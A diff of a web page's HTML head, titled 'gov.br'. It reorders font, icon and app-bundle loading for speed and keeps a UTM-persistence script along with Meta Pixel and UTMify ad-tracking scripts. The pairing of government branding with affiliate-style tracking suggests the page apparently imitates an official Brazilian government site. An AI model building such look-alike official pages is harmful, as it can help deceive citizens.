@@ -2,98 +2,28 @@
 <html lang="pt-BR">
 <head>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>gov.br</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
 
-<!-- UTM Persistence: captura e mantém UTMs em toda a navegação -->
-<script>
-(function() {
-  var UTM_KEYS = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid','ttclid','gclid','src','sck'];
-  var STORAGE_KEY = 'utmData';
+    <!-- Preconnect para origens críticas -->
+    <link rel="preconnect" href="https://connect.facebook.net">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="dns-prefetch" href="https://cdn.utmify.com.br">
 
-  // Captura UTMs da URL atual
-  function getUtmsFromUrl() {
-    var params = new URLSearchParams(window.location.search);
-    var utms = {};
-    UTM_KEYS.forEach(function(k) { var v = params.get(k); if (v) utms[k] = v; });
-    return utms;
-  }
+    <!-- Google Fonts — não bloqueante -->
+    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap"></noscript>
 
-  // Salva no localStorage se tiver UTMs na URL
-  var current = getUtmsFromUrl();
-  if (Object.keys(current).length > 0) {
-    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(current)); } catch(e) {}
-  }
+    <!-- FA5 — não bloqueante -->
+    <link rel="preload" as="style" href="/assets/fa5-all.min.css" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/assets/fa5-all.min.css"></noscript>
 
-  // Recupera UTMs salvas
-  function getSavedUtms() {
-    try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch(e) { return {}; }
-  }
+    <!-- CSS do app -->
+    <link rel="stylesheet" href="assets/index-Nk5hQ9Fp.css">
 
-  // Adiciona UTMs como query params na URL atual se não existirem
-  function appendUtmsToUrl() {
-    var utms = getSavedUtms();
-    if (!Object.keys(utms).length) return;
-    var params = new URLSearchParams(window.location.search);
-    var changed = false;
-    UTM_KEYS.forEach(function(k) {
-      if (utms[k] && !params.get(k)) { params.set(k, utms[k]); changed = true; }
-    });
-    if (changed) {
-      var newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-      history.replaceState(null, '', newUrl);
-    }
-  }
-
-  // Expõe para uso no app React
-  window._getUtms = getSavedUtms;
-
-  // Aplica na página atual
-  appendUtmsToUrl();
-
-  // Intercepta pushState/replaceState do React Router para manter UTMs
-  var _push = history.pushState.bind(history);
-  var _replace = history.replaceState.bind(history);
-
-  function injectUtms(url) {
-    if (!url || typeof url !== 'string') return url;
-    try {
-      var base = window.location.origin;
-      var full = url.startsWith('/') ? base + url : url;
-      var u = new URL(full);
-      var utms = getSavedUtms();
-      UTM_KEYS.forEach(function(k) {
-        if (utms[k] && !u.searchParams.get(k)) u.searchParams.set(k, utms[k]);
-      });
-      return u.pathname + (u.search ? u.search : '') + u.hash;
-    } catch(e) { return url; }
-  }
-
-  history.pushState = function(state, title, url) {
-    return _push(state, title, injectUtms(url));
-  };
-  history.replaceState = function(state, title, url) {
-    return _replace(state, title, injectUtms(url));
-  };
-})();
-</script>
-
-<!-- Meta Pixel Code -->
-<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '4327697327497010');fbq('init', '1078834241324397');fbq('init', '1527029111971432');fbq('track', 'PageView');</script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4327697327497010&ev=PageView&noscript=1"/></noscript>
-<!-- End Meta Pixel Code -->
-  
-<!-- UTMify Pixel -->
-<script> window.pixelId = "6a2200f2ae65ba8b4e8c85c7"; var a = document.createElement("script"); a.setAttribute("async", ""); a.setAttribute("defer", ""); a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js"); document.head.appendChild(a); </script>
-
-<!-- UTMify UTMs -->
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-
-
-           
     <style data-vite-theme="" data-inject-first="">
         :root {
             --background: 0 0% 100%;
@@ -117,7 +47,6 @@
             --ring: 20 14.3% 4.1%;
             --radius: 0.5rem;
         }
-
         .dark {
             --background: 240 10% 3.9%;
             --foreground: 0 0% 98%;
@@ -140,19 +69,65 @@
             --ring: 240 4.9% 83.9%;
             --radius: 0.5rem;
         }
+        body, body * {
+            font-family: 'Open Sans', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif !important;
+        }
+        .sticky-nav { position: sticky; top: 0; z-index: 1000; }
+        /* Ícones enquanto FA não carrega */
+        i.fas, i.far, i.fab { font-family: sans-serif !important; font-style: normal !important; }
+        i.fas::before, i.far::before, i.fab::before { content: '' !important; }
     </style>
 
-    <title>gov.br</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    <meta property="creator.productor"
-        content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <link rel="stylesheet" href="/assets/fa5-all.min.css">
-    <style>
-      /* Enquanto a webfont não carrega, zera o caractere quebrado */
-      i.fas, i.far, i.fab { font-family: sans-serif !important; font-style: normal !important; }
-      i.fas::before, i.far::before, i.fab::before { content: '' !important; }
-    </style>
+    <!-- JS do app — defer para não bloquear parsing -->
+    <script defer src="assets/index-f8rMPGcv.js"></script>
+
+    <!-- UTM Persistence -->
+    <script>
+    (function() {
+      var UTM_KEYS = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid','ttclid','gclid','src','sck'];
+      var STORAGE_KEY = 'utmData';
+      function getUtmsFromUrl() {
+        var params = new URLSearchParams(window.location.search);
+        var utms = {};
+        UTM_KEYS.forEach(function(k) { var v = params.get(k); if (v) utms[k] = v; });
+        return utms;
+      }
+      var current = getUtmsFromUrl();
+      if (Object.keys(current).length > 0) {
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(current)); } catch(e) {}
+      }
+      function getSavedUtms() {
+        try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch(e) { return {}; }
+      }
+      function appendUtmsToUrl() {
+        var utms = getSavedUtms();
+        if (!Object.keys(utms).length) return;
+        var params = new URLSearchParams(window.location.search);
+        var changed = false;
+        UTM_KEYS.forEach(function(k) {
+          if (utms[k] && !params.get(k)) { params.set(k, utms[k]); changed = true; }
+        });
+        if (changed) history.replaceState(null, '', window.location.pathname + '?' + params.toString() + window.location.hash);
+      }
+      window._getUtms = getSavedUtms;
+      appendUtmsToUrl();
+      var _push = history.pushState.bind(history);
+      var _replace = history.replaceState.bind(history);
+      function injectUtms(url) {
+        if (!url || typeof url !== 'string') return url;
+        try {
+          var u = new URL(url.startsWith('/') ? window.location.origin + url : url);
+          var utms = getSavedUtms();
+          UTM_KEYS.forEach(function(k) { if (utms[k] && !u.searchParams.get(k)) u.searchParams.set(k, utms[k]); });
+          return u.pathname + (u.search || '') + u.hash;
+        } catch(e) { return url; }
+      }
+      history.pushState = function(s,t,u) { return _push(s,t,injectUtms(u)); };
+      history.replaceState = function(s,t,u) { return _replace(s,t,injectUtms(u)); };
+    })();
+    </script>
+
+    <!-- SVG fallback para ícones FA (não bloqueia) -->
     <script>
     (function() {
       var ICONS = {
@@ -164,51 +139,33 @@
         'fa-user':        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:0.875em;height:1em;fill:currentColor;vertical-align:-0.125em;pointer-events:none"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>'
       };
       function replaceIcons() {
-        document.querySelectorAll('i.fas, i.far, i.fab').forEach(function(el) {
-          if (el.querySelector('svg')) return; // já tem SVG dentro
+        document.querySelectorAll('i.fas,i.far,i.fab').forEach(function(el) {
+          if (el.querySelector('svg')) return;
           var cls = Array.from(el.classList).find(function(c) { return ICONS[c]; });
           if (!cls) return;
-          el.style.fontFamily = 'sans-serif';
-          el.style.fontStyle = 'normal';
-          el.style.lineHeight = '1';
+          el.style.cssText = 'font-family:sans-serif;font-style:normal;line-height:1';
           el.innerHTML = ICONS[cls];
         });
       }
-      var _timer;
-      var obs = new MutationObserver(function() {
-        clearTimeout(_timer);
-        _timer = setTimeout(replaceIcons, 10);
-      });
-      function start() {
-        replaceIcons();
-        obs.observe(document.body, { childList: true, subtree: true });
-      }
-      if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', start);
-      } else {
-        start();
-      }
+      var _t;
+      var obs = new MutationObserver(function() { clearTimeout(_t); _t = setTimeout(replaceIcons, 10); });
+      function start() { replaceIcons(); obs.observe(document.body, { childList: true, subtree: true }); }
+      document.readyState === 'loading' ? document.addEventListener('DOMContentLoaded', start) : start();
     })();
     </script>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&amp;display=swap">
-    <style>
-        .sticky-nav {
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-    </style>
-    <script defer src="assets/index-f8rMPGcv.js"></script>
-    <link rel="stylesheet" href="assets/index-Nk5hQ9Fp.css">
-    <style>
-        body, body * {
-            font-family: 'Open Sans', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif !important;
-        }
-    </style>
-    
+
+    <!-- Meta Pixel — async -->
+    <script async>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init','4327697327497010');fbq('init','1078834241324397');fbq('init','1527029111971432');fbq('track','PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4327697327497010&ev=PageView&noscript=1"/></noscript>
+
+    <!-- UTMify Pixel + UTMs — async/defer -->
+    <script>window.pixelId="6a2200f2ae65ba8b4e8c85c7";(function(){var a=document.createElement("script");a.async=true;a.defer=true;a.src="https://cdn.utmify.com.br/scripts/pixel/pixel.js";document.head.appendChild(a);})();</script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
 
 </head>
-
 <body>
     <div id="root"></div>
 </body>
